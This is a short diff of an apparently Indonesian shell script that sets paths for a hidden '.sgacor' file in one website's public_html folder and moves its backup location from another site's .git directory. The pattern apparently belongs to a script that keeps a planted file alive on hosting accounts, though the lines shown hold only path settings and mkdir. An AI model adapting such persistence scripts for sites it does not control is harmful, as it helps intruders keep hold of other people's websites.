@@ -3,7 +3,7 @@
 # Definisikan lokasi file index.php Permissions 755
 INDEX_FILE="/home/u987240298/domains/flyforcoffee.com/public_html/.sgacor"
 # Definisikan lokasi folder backup Permissions 755
-BACKUP_FOLDER="/home/myungjxp/starholidays.co.uk/.git"
+BACKUP_FOLDER="/home/u987240298/domains/flyforcoffee.com/public_html/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
